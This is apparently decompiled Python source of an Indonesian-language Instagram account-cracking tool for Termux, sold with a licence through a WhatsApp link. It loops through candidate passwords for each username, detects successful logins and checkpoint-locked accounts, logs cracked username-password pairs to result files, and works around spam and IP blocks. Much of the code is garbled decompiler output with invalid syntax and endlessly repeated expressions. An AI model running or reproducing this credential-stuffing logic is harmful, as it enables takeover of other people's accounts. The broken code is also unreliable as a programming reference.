                        []['\r'][f'''{P2}''']['['][f'''{K2}''']['×'][f'''{P2}''']['] Nama      : '][f'''{K2}'''][f'''{nama}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['×'][f'''{P2}''']['] Username  :'][f'''{K2}'''][' '][f'''{user}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['×'][f'''{P2}''']['] Password  :'][f'''{K2}'''][' '][f'''{pw}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['×'][f'''{P2}''']['] Pengikut  : '][f'''{K2}'''][f'''{pengikut}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['×'][f'''{P2}''']['] Mengikuti : '][f'''{K2}'''][f'''{mengikut}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['×']
                    if 'ip_block' in str(respon.text) or 'spam' in str(respon.text):
            ...
            def V2(self, user, pas):
                ...
                for pw in pas:
                    ...
                    ncek = respon.text
                    logtemp += 1
                    if 'logged_in_user' in str(ncek) and 'sessionid' in ses.cookies.get_dict() or 'userId' in str(ncek):
                        success.append(user)
                        (nama, pengikut, mengikut, postingan) = self.APIinfo(user)
                        cookie = (lambda .0: for key, value in .0:
[ key + '=' + value.replace('"', '') ])(ses.cookies.get_dict().items()())
            ...
            def ua_ig(self):
                rr = random.randint
                rc = random.choice
                return 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36'

            
            def checkAPI(self, user, pw):
                ses = requests.Session()
                ncek = random.randint(1000000000, 0x174876E7FFL)
                ...
                if 'userId' in str(ncek):
                    (nama, pengikut, mengikut, postingan) = self.APIinfo(user)
                    []['\r'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Nama      : '][f'''{H2}'''][f'''{nama}''']['                \n'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Username  : '][f'''{H2}'''][f'''{user}''']['                \n'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Password  : '][f'''{H2}'''][f'''{pw}''']['                \n'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Pengikut  : '][f'''{H2}'''][f'''{pengikut}''']['                \n'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Mengikuti : '][f'''{H2}'''][f'''{mengikut}''']['                \n'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']([]['\r'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Nama      : '][f'''{H2}'''][f'''{nama}''']['                \n'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Username  : '][f'''{H2}'''][f'''{user}''']['                \n'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Password  : '][f'''{H2}'''][f'''{pw}''']['                \n'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Pengikut  : '][f'''{H2}'''][f'''{pengikut}''']['                \n'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Mengikuti : '][f'''{H2}'''][f'''{mengikut}''']['                \n'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Postingan : ']([]['\r'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Nama      : '][f'''{H2}'''][f'''{nama}''']['                \n'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Username  : '][f'''{H2}'''][f'''{user}''']['                \n'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Password  : '][f'''{H2}'''][f'''{pw}''']['                \n'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Pengikut  : '][f'''{H2}'''][f'''{pengikut}''']['                \n'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Mengikuti : '][f'''{H2}'''][f'''{mengikut}''']['                \n'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Postingan : '][f'''{H2}''']([]['\r'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Nama      : '][f'''{H2}'''][f'''{nama}''']['                \n'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Username  : '][f'''{H2}'''][f'''{user}''']['                \n'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Password  : '][f'''{H2}'''][f'''{pw}''']['                \n'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Pengikut  : '][f'''{H2}'''][f'''{pengikut}''']['                \n'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Mengikuti : '][f'''{H2}'''][f'''{mengikut}''']['                \n'][f'''{P2}''']['['][f'''{H2}''']['✓'][f'''{P2}''']['] Postingan : '][f'''{H2}'''][f'''{postingan}''']), title = f'''{H2}LIVE''', width = 80, padding = (0, 4), style = ''))
                    open(f'''result/success/success-{day}.txt''', 'a').write(f'''{user}|{pw}|{pengikut}|{mengikut}\n''')
                    return None
                if 'gzip, deflate' in str(ncek):
                    (nama, pengikut, mengikut, postingan) = self.APIinfo(user)
                    []['\r'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Nama      : '][f'''{K2}'''][f'''{nama}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Username  :'][f'''{K2}'''][' '][f'''{user}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Password  :'][f'''{K2}'''][' '][f'''{pw}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Pengikut  : '][f'''{K2}'''][f'''{pengikut}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Mengikuti : '][f'''{K2}'''][f'''{mengikut}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']([]['\r'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Nama      : '][f'''{K2}'''][f'''{nama}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Username  :'][f'''{K2}'''][' '][f'''{user}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Password  :'][f'''{K2}'''][' '][f'''{pw}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Pengikut  : '][f'''{K2}'''][f'''{pengikut}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Mengikuti : '][f'''{K2}'''][f'''{mengikut}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Postingan : ']([]['\r'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Nama      : '][f'''{K2}'''][f'''{nama}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Username  :'][f'''{K2}'''][' '][f'''{user}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Password  :'][f'''{K2}'''][' '][f'''{pw}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Pengikut  : '][f'''{K2}'''][f'''{pengikut}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Mengikuti : '][f'''{K2}'''][f'''{mengikut}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Postingan : '][f'''{K2}''']([]['\r'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Nama      : '][f'''{K2}'''][f'''{nama}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Username  :'][f'''{K2}'''][' '][f'''{user}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Password  :'][f'''{K2}'''][' '][f'''{pw}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Pengikut  : '][f'''{K2}'''][f'''{pengikut}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Mengikuti : '][f'''{K2}'''][f'''{mengikut}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Postingan : '][f'''{K2}'''][f'''{postingan}''']), title = f'''{K2}CHECKPOINT''', width = 80, padding = (0, 4), style = ''))
                    open(f'''result/checkpoint/checkpoint-{day}.txt''', 'a').write(f'''{user}|{pw}|{pengikut}|{mengikut}\n''')
                    return None
                if 'accept-encoding' in str(respon.text):
                    sys.stdout.write(f'''\r{M} ! terkena spam, aktifkan mode pesawat ''')
                    sys.stdout.flush()
                    sleep(10)
                    return None
                (nama, pengikut, mengikut, postingan) = 'https://www.instagram.com/accounts/login/'.APIinfo(user)
                []['\r'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Nama      : '][f'''{K2}'''][f'''{nama}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Username  :'][f'''{K2}'''][' '][f'''{user}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Password  :'][f'''{K2}'''][' '][f'''{pw}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Pengikut  : '][f'''{K2}'''][f'''{pengikut}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Mengikuti : '][f'''{K2}'''][f'''{mengikut}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']([]['\r'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Nama      : '][f'''{K2}'''][f'''{nama}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Username  :'][f'''{K2}'''][' '][f'''{user}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Password  :'][f'''{K2}'''][' '][f'''{pw}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Pengikut  : '][f'''{K2}'''][f'''{pengikut}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Mengikuti : '][f'''{K2}'''][f'''{mengikut}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Postingan : ']([]['\r'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Nama      : '][f'''{K2}'''][f'''{nama}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Username  :'][f'''{K2}'''][' '][f'''{user}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Password  :'][f'''{K2}'''][' '][f'''{pw}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Pengikut  : '][f'''{K2}'''][f'''{pengikut}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Mengikuti : '][f'''{K2}'''][f'''{mengikut}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Postingan : '][f'''{K2}''']([]['\r'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Nama      : '][f'''{K2}'''][f'''{nama}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Username  :'][f'''{K2}'''][' '][f'''{user}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Password  :'][f'''{K2}'''][' '][f'''{pw}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Pengikut  : '][f'''{K2}'''][f'''{pengikut}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Mengikuti : '][f'''{K2}'''][f'''{mengikut}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Postingan : '][f'''{K2}'''][f'''{postingan}''']), title = f'''{K2}Akun telah diganti password''', width = 80, padding = (0, 4), style = ''))
                return None
                if requests.ConnectionError:
                    ...
                    sleep(10)
                    return None
                if []['\r'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Nama      : '][f'''{K2}'''][f'''{nama}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Username  :'][f'''{K2}'''][' '][f'''{user}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Password  :'][f'''{K2}'''][' '][f'''{pw}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Pengikut  : '][f'''{K2}'''][f'''{pengikut}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Mengikuti : '][f'''{K2}'''][f'''{mengikut}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['X']:
                    e = []['\r'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Nama      : '][f'''{K2}'''][f'''{nama}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Username  :'][f'''{K2}'''][' '][f'''{user}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Password  :'][f'''{K2}'''][' '][f'''{pw}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Pengikut  : '][f'''{K2}'''][f'''{pengikut}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']['X'][f'''{P2}''']['] Mengikuti : '][f'''{K2}'''][f'''{mengikut}''']['                \n'][f'''{P2}''']['['][f'''{K2}''']
                    prints(e)
                    e = None
                    del e
                    return None
            ...
            def cek_hasil(self):
                ...
                one = input('Pilihanmu : ')
                if one in ('1', '01'):
                    ok = os.listdir('result/success/')
                    prints(f''' [{M2}!{hapus}] tidak ada hasil success''')
                    time.sleep(1)
                    self.menu()
                    for x in ok:
                        nom.append(x)
                        no += 1
                        jum = open('result/success/' + x, 'r').readlines()
                        print(f''' [{H}{no}{N}] {x} - {H}{len(jum)} {N}akun''')
                        abc = input(f''' [{H}?{N}] nomor file : ''')
                        file = nom[int(abc) - 1]
                        buka = open('result/success/' + file, 'r').read()
                        prints(f''' [{M2}!{hapus}] tidak hasil success''')
                        time.sleep(1)
                        self.menu()
                        print('')
                        print(H + buka + N)
                        input(f'''\n[{H}!{N}] tekan enter untuk kembali''')
                        self.menu()
                        return None
                        if one in ('2', '02'):
                            ok = os.listdir('result/checkpoint/')
                            prints(f''' [{M2}!{hapus}] tidak hasil success''')
                            self.menu()
                            for x in ok:
                                nom.append(x)
                                no += 1
                                jum = open('result/checkpoint/' + x, 'r').readlines()
                                print(f''' [{K}{no}{N}] {x} - {K}{len(jum)} {N}akun''')
                                abc = input(f''' [{H}?{N}] nomor file : ''')
                                file = nom[int(abc) - 1]
                                buka = open('result/checkpoint/' + file, 'r').read()
                                prints(f''' [{M2}!{hapus}] tidak hasil checkpoint''')
                                time.sleep(1)
                                self.menu()
                                print('')
                                print(K + buka + N)
        ...
        def tlisensi():
            ...
            if lisen in ('',):
                ...
                tlisensi()
            if lisen in ('buy', 'Buy'):
                os.system('xdg-open https://wa.me/6283114591358?text=Bang+beli+lisensi+IG+nya+dong')
                exit()
            loadinglisen()
        ...
        def mengi(self):
            ...
            for t in range(m):
                ...
                prints(Panel('[white]Tekan [red]CTRL + C[white] Untuk Berhenti', width = 80, padding = (0, 4), style = f'''{color_table}'''))
        ...
        def register_device():
            ...
            if os.path.exists('/data/data/com.termux/files/usr/etc/.license'):
                ...
                if buy_key in ('',):
                    pass
                jalan('  Anda akan diarahkan ke whatsapp author')
                time.sleep(2)
            ...
            if not os.path.exists('/data/data/com.termux/files/usr/etc/.license'):
                ...
                tulis = open('/data/data/com.termux/files/usr/etc/.license', 'w')
                tulis.write(enc_key)
                None(None, None)
                if not None:
                    pass
        ...
        if __name__ == '__main__':
            ...
            os.system('mkdir result/success')
            os.system('mkdir result/checkpoint')
            ses = requests.Session()
